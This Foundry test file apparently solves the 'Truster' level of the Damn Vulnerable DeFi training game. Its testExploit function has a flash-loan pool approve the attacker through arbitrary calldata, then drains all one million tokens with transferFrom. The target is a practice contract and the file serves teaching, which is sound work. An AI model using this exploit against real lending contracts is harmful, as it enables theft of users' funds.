// SPDX-License-Identifier: MIT
// https://stermi.medium.com/damn-vulnerable-defi-challenge-3-solution-truster-7a4e00233ecd
pragma solidity >=0.8.14;

import {Test} from "forge-std/Test.sol";
import {Utilities} from "../Utilities.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
// import {TrusterLenderPool} from "../../../Contracts/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {

        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));

        // Act as the attacker
         vm.prank(attacker);

        // make the pool approve the attacker to manage the whole pool balance while taking a free loan
        bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
        
        trusterLenderPool.flashLoan(0, attacker, address(dvt), attackCallData);

        // now steal all the funds
        vm.prank(attacker);
        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);

        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
